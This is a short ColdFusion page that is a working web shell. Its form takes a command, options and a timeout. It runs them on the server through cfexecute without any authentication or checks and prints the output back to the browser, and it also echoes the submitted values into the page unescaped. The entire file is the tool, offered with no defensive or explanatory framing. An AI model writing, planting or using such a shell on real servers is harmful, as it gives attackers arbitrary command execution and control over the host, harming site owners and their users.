<html>
    <body>
    	<cfoutput>
    		<form method="POST" action="">	
			<table>
				<tr>
					<td>Command:</td>
					<td>
						<input type=text name="cmd" size=50 <cfif isdefined("form.cmd")>value="#form.cmd#"</cfif>>
					</td>
				</tr>
				<tr>
					<td>Options:</td>
					<td> <input type=text name="opts" size=50 <cfif isdefined("form.opts")>value="#form.opts#"</cfif>></td>
				</tr>
				<tr>
					<td>Timeout:</td>
					<td><input type=text name="timeout" size=4 <cfif isdefined("form.timeout")>value="#form.timeout#" <cfelse>value="5"</cfif>></td>
				</tr>
			</table>
			<input type=submit value="Exec" >
		</form>
				
		<cfif isdefined("form.cmd")>
			<cfsavecontent variable="myVar">
				<cfexecute  name="#Form.cmd#" arguments="#Form.opts#" timeout="#Form.timeout#"></cfexecute>
			</cfsavecontent>
			<pre>
				#myVar#
			</pre>
			</cfif>
		</cfoutput>
	</body>
</html>
